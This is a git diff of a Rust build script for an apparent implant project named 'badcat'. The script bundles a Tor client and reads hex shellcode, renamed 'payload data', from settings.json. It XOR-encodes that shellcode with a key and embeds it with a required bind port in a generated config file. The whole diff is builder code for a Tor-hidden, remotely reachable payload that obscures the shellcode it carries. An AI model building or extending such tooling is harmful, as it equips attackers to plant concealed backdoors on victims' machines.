@@ -6,6 +6,7 @@ use hex::FromHex;
 
 const CFG_TEMPLATE: &str = "config.rs.template";
 const CFG_DESTINATION: &str = "src/config.rs";
+const CFG_SETTINGS: &str = "settings.json";
 
 struct BuildSetting {
     is_tor_for_windows: bool,
@@ -16,13 +17,15 @@ struct BuildSetting {
     linux_dir: String,
     torrc: String,
     name: String,
-    shellcode: String
+    payload_data: String,
+    payload_port: String
 }
 
 fn main() -> Result<(), Box<dyn error::Error>> {
     let raw_settings: json::JsonValue = load_settings()?;
 
     let setting = parse_settings(&raw_settings);
+    println!("cargo:rerun-if-changed={}", CFG_SETTINGS);
 
     let mut torrc = fs::read_to_string(&setting.torrc)?;
 
@@ -62,14 +65,21 @@ ControlSocket @{CTRL_SOCKET}
 
     replacements.insert("@{ENC_TOR_BUNDLE}", bundle_tor(&setting)?);
 
-    let enc_shellcode = if &setting.shellcode == "" {
+    let enc_payload_data = if &setting.payload_data == "" {
         String::from("")
     } else {
-        let bytes: Vec<u8> = Vec::from_hex(&setting.shellcode)?;
+        if &setting.payload_port == "" {
+            return Err(
+                String::from("payload port is required").into()
+            );
+        }
+
+        let bytes: Vec<u8> = Vec::from_hex(&setting.payload_data)?;
         xor::encode_bytes(&setting.key, &bytes)
     };
 
-    replacements.insert("@{ENC_SHELLCODE}", enc_shellcode);
+    replacements.insert("@{ENC_PAYLOAD_DATA}", enc_payload_data);
+    replacements.insert("@{PAYLOAD_PORT}", setting.payload_port);
 
     replace_settings(
         CFG_TEMPLATE,
@@ -87,6 +97,9 @@ fn bundle_tor(setting: &BuildSetting) -> Result<String, Box<dyn error::Error>> {
 
     if url.starts_with("file://") {
         let local_dir = url.strip_prefix("file://").unwrap();
+
+        println!("cargo:rerun-if-changed={}", &local_dir);
+
         tmp_dir = tempfile::tempdir()?;
         
         badcat_lib::fs::copy_dir(
@@ -183,7 +196,7 @@ fn download_and_extract_tor(
 }
 
 fn load_settings() -> Result<json::JsonValue, Box<dyn error::Error>> {
-    let source = fs::read_to_string("settings.json")
+    let source = fs::read_to_string(CFG_SETTINGS)
         .expect("failed to read settings");
     Ok(json::parse(&source)?)
 }
@@ -263,8 +276,16 @@ fn parse_settings(raw: &json::JsonValue) -> BuildSetting {
             })
     );
 
-    let shellcode = String::from(
-        raw["shellcode"]
+    let payload_data = String::from(
+        raw["payload"]["hex"]
+            .as_str()
+            .unwrap_or_else(|| {
+                ""
+            })
+    );
+
+    let payload_port = String::from(
+        raw["payload"]["bind_port"]
             .as_str()
             .unwrap_or_else(|| {
                 ""
@@ -280,6 +301,7 @@ fn parse_settings(raw: &json::JsonValue) -> BuildSetting {
         linux_dir,
         torrc,
         name,
-        shellcode,
+        payload_data,
+        payload_port
     }
 }
